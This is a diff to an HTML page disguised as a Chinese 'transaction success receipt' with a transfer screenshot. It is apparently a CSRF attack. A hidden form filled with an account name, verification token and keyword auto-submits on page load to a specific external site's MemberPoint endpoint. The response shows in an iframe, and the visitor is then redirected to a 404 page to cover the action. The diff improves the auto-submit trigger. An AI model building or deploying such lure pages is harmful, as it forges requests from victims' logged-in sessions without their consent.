@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>转账凭证</title>
+  <title>交易成功凭证</title>
   <style>
     body {
       background-color: #fff;
@@ -29,7 +29,8 @@
   <h2>交易成功凭证</h2>
   <img src="transfer_proof.png" alt="转账截图">
 
-  <form id="csrfForm" method="POST" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index" target="resultFrame">
+  <!-- ✅ 表单：提交到目标站，响应显示在 iframe 中 -->
+  <form id="csrfForm" method="POST" target="resultFrame" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index">
     <input type="hidden" name="decide" value="">
     <input type="hidden" name="checkVerifc" value="4fe83a323debe74285b611d1a3c2fb83">
     <input type="hidden" name="memberAccount" value="n1a8899">
@@ -45,21 +46,23 @@
     <input type="hidden" name="keyWord" value="9521">
   </form>
 
+  <!-- ✅ iframe：不隐藏，用于展示响应内容 -->
   <iframe name="resultFrame" id="resultFrame"></iframe>
 
   <script>
-    // 提交表单
-    document.getElementById('csrfForm').submit();
-    console.log("✅ 表单已提交");
+    // 1. 页面加载完成时立即提交表单
+    window.onload = () => {
+      console.log("✅ 页面加载，提交表单...");
+      document.getElementById("csrfForm").submit();
+    };
 
-    // 等 iframe 加载完毕后，5 秒跳转
-    document.getElementById('resultFrame').onload = () => {
-      console.log("📥 iframe 加载完成，准备倒计时跳转");
+    // 2. 等 iframe 加载完毕 → 再倒计时 5 秒跳转
+    document.getElementById("resultFrame").addEventListener("load", () => {
+      console.log("📥 iframe 加载完毕，5 秒后跳转到 404...");
       setTimeout(() => {
-        console.log("⏳ 跳转到 404...");
         window.location.href = "https://nb113.net/404.html";
       }, 5000);
-    };
+    });
   </script>
 
 </body>
